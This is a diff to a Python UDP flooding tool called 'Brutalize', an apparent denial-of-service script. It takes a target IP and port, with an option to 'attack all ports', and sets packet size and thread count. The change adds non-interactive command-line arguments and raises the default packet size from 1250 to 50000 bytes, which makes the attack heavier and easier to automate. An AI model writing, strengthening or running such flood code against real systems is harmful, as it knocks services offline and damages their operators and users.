@@ -7,6 +7,7 @@ from time import time, sleep
 from pystyle import *
 from getpass import getpass as hinput
 
+import sys
 
 
 class Brutalize:
@@ -14,7 +15,7 @@ class Brutalize:
     def __init__(self, ip, port, force, threads):
         self.ip = ip
         self.port = port
-        self.force = force # default: 1250
+        self.force = force # default: 50000
         self.threads = threads # default: 100
 
         self.client = socket(family=AF_INET, type=SOCK_DGRAM)
@@ -149,11 +150,23 @@ def error(text, start='\n'):
 
 
 def main():
+    params_mode=False
+    if(len(sys.argv)>1):
+        params_mode=True
+        
+
+    
     print()
     print(Colorate.Diagonal(Col.DynamicMIX((Col.white, bpurple)), Center.XCenter(banner)))
 
 
-    ip = input(stage(f"Enter the IP to Brutalize {purple}->{fluo2} ", '?'))
+    if(params_mode):
+        try:
+            ip = str(sys.argv[1])
+        except:
+            ip = ""
+    else:
+        ip = input(stage(f"Enter the IP to Brutalize {purple}->{fluo2} ", '?'))
     print()
 
     try:
@@ -164,8 +177,13 @@ def main():
         error("Error! Please enter a correct IP address.")
 
 
-
-    port = input(stage(f"Enter port {purple}[{white}press {fluo2}enter{white} to attack all ports{purple}] {purple}->{fluo2} ", '?'))
+    if(params_mode):
+        try:
+            port = str(sys.argv[2])
+        except:
+            port = ""
+    else:
+        port = input(stage(f"Enter port {purple}[{white}press {fluo2}enter{white} to attack all ports{purple}] {purple}->{fluo2} ", '?'))
     print()
 
     if port == '':
@@ -178,19 +196,31 @@ def main():
         except ValueError:
             error("Error! Please enter a correct port.")
 
-    force = input(stage(f"Bytes per packet {purple}[{white}press {fluo2}enter{white} for 1250{purple}] {purple}->{fluo2} ", '?'))
+
+    if(params_mode):
+        try:
+            force = str(sys.argv[3])
+        except:
+            force = ""
+    else:
+        force = input(stage(f"Bytes per packet {purple}[{white}press {fluo2}enter{white} for 50000{purple}] {purple}->{fluo2} ", '?'))
     print()
 
     if force == '':
-        force = 1250
+        force = 50000
     else:
         try:
             force = int(force)
         except ValueError:
             error("Error! Please enter an integer.")
 
-
-    threads = input(stage(f"Threads {purple}[{white}press {fluo2}enter{white} for 100{purple}] {purple}->{fluo2} ", '?'))
+    if(params_mode):
+        try:
+            threads = str(sys.argv[4])
+        except:
+            threads = ""
+    else:
+        threads = input(stage(f"Threads {purple}[{white}press {fluo2}enter{white} for 100{purple}] {purple}->{fluo2} ", '?'))
     print()
 
     if threads == '':
@@ -222,7 +252,6 @@ def main():
     print('\n')
     sleep(1)
 
-    hinput(stage(f"Press {fluo2}enter{white} to {fluo}exit{white}.", '.'))
 
 if __name__ == '__main__':
     main()    
